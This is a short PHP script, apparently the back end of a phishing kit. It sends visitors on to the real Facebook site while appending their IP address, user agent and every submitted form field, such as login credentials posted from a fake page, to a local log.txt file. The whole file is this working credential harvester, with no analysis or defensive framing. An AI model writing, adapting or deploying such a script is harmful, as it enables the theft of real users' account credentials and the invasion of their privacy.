<?php
header ('Location: https://www.facebook.com');
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$browser = $_SERVER['HTTP_USER_AGENT'];

$handle = fopen("log.txt", "a");

fwrite($handle, "===================================");
fwrite($handle, "\r\n");
fwrite($handle, "IP: ");
fwrite($handle, $ipaddress);
fwrite($handle, "\r\n");
fwrite($handle, "User-Agent: ");
fwrite($handle, $browser);
fwrite($handle, "\r\n");;
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n");
fclose($handle);
exit;
?>